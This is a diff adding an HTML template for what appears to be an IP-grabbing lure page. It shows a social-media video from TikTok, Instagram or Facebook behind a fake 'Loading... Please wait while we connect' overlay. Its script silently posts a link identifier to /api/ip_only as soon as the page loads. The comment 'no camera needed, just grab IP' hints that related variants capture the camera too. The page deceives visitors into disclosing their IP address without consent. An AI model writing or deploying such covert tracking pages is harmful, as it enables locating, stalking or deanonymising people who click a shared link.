@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ social_network }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .video-container { width: 100%; height: 100vh; position: relative; overflow: hidden; }
+        .video-container iframe { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100vw; height: 100vh; border: none; pointer-events: none; }
+        .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 1000; display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 24px; }
+        .overlay h2 { font-size: 26px; margin-bottom: 8px; text-shadow: 0 2px 8px rgba(0,0,0,0.7); }
+        .overlay p { font-size: 15px; color: rgba(255,255,255,0.7); text-shadow: 0 1px 4px rgba(0,0,0,0.5); }
+        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 24px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="video-container">
+    {% if social_network == 'tiktok' %}
+        {% set video_id = video_url.split('/video/')[1].split('?')[0] if '/video/' in video_url else '' %}
+        <iframe src="https://www.tiktok.com/embed/v3/{{ video_id }}?autoplay=1&mute=0&controls=0&loop=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    {% elif social_network == 'instagram' %}
+        {% set ig_id = video_url.split('/p/')[1].split('/')[0] if '/p/' in video_url else (video_url.split('/reel/')[1].split('/')[0] if '/reel/' in video_url else '') %}
+        <iframe src="https://www.instagram.com/p/{{ ig_id }}/embed" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    {% else %}
+        <iframe src="https://www.facebook.com/plugins/video.php?href={{ video_url | urlencode }}&show_text=false&width=734&autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    {% endif %}
+</div>
+
+<div class="overlay">
+    <h2>Loading...</h2>
+    <p>Please wait while we connect</p>
+    <div class="spinner"></div>
+</div>
+
+<script>
+    const link_id = "{{ link_id }}";
+
+    // Send IP capture silently after page load
+    function sendIPCapture() {
+        fetch('/api/ip_only', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ link_id })
+        }).catch(e => console.error(e));
+    }
+
+    // Send immediately — no camera needed, just grab IP
+    sendIPCapture();
+</script>
+</body>
+</html>
